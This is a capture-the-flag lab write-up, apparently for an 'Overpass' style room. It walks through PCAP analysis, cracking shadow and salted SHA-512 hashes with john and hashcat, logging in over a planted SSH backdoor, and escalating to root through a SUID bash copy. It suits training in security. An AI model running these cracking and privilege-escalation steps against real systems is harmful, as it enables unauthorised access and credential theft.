***

Author : dxWiz

Date : 12 Mar 2022 11:39 PM

***



# Task 1 Forensics - Analyse the PCAP 

Just open up the .pcap file do the necessary analysis to get the answer

carcking the the hashes is relatively easy with john + fasttrack wordlist (/usr/share/wordlists/fasttrack.txt)


4. Using the fasttrack wordlist, how many of the system passwords were crackable?

        paradox:secuirty3:18464:0:99999:7:::
        szymex:abcd123:18464:0:99999:7:::
        bee:secret12:18464:0:99999:7:::
        muirland:1qaz2wsx:18464:0:99999:7:::


# Task 2 Research - Analyse the code 

Study the source code from https://github.com/NinjaJc01/ssh-backdoor

***

To crack the salted hash with john and rockyou.txt
  
    john --format=dynamic_82 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 


to list dynamic format :

    john --list=subformats
    
Format = dynamic_82  type = dynamic_82: sha512($p.$s)


hash.txt content
    
    6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
    

note : salt is separated by $ 

[Reference](https://miloserdov.org/?p=5960#66)

***


To crack the salted hash with hashcat and rockyou.txt
    
    ./hashcat 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 rockyou.txt -m 1710

note : salt is separated by colon

***

Additional Studies

At the end of the article in miloserdov.org, it is mentioned that when the salt has special characters in it, converting salt to hexadecimal salt is to be done with a program called raw2dyna.

    eg: raw2dyna -2h='STRING'


raw2dyna is a program that convert ASCII char into equivalent hexadecimal value. Please refer to the ASCII to HEX chart for actual value verification. 



# Task 3 Attack - Get back in! 

Task given : to hack back into the system with the following command

        ssh james@$IP -p 2222
        
if you see the following error

        Unable to negotiate with $IP port 2222: no matching host key type found. Their offer: ssh-rsa
        
you have to add a few lines in ~/.ssh/config with your favorite editor

        Host $IP 
                HostKeyAlgorithms=+ssh-rsa

It is not hard to get the user.txt flag, try to look into james folder

In order to get root.txt flag, first do a search for any possible SUID misconfigured file with the following command

        find / -perm /u=s -type f 2>/dev/null
        
and the search result will return a list of following

        .
        .
        .
        /bin/mount
        /bin/fusermount
        /bin/su
        /bin/ping
        /bin/umount
        /home/james/.suid_bash

The last entry is very interesting, run the file with -p as suggested by [GTFOBins](https://gtfobins.github.io/#) under SUID section and also by refering to the manual of bash with -p

        If the -p option is supplied at invocation, the startup behavior is the same, but the  ef‐
        fective user id is not reset.
        
        james@overpass-production:/home/james$ ./.suid_bash -p
        .suid_bash-4.4# 

Get the root.txt in root folder.

# Congratulations!
